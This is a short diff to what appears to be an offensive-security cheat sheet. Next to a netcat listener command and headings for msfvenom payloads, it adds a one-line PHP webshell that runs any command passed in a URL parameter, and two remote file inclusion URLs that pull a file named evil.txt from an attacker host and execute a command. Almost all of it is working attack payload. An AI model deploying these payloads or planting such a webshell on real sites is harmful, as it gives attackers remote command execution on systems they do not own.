@@ -1558,6 +1558,12 @@ sudo nc -lnvp {PORT}
 #### NC Execute - Server [STEP 2]
 
 ```bash
+# PHP webshell
+<?php echo shell_exec($_GET['cmd']); ?>
+
+page.php?page=http://{LHOST}/evil.txt&cmd={command}
+page.php?file=http://{LHOST}/evil.txt&cmd={command}
+
 # MSFVENOM Payloads
 
 # Windows
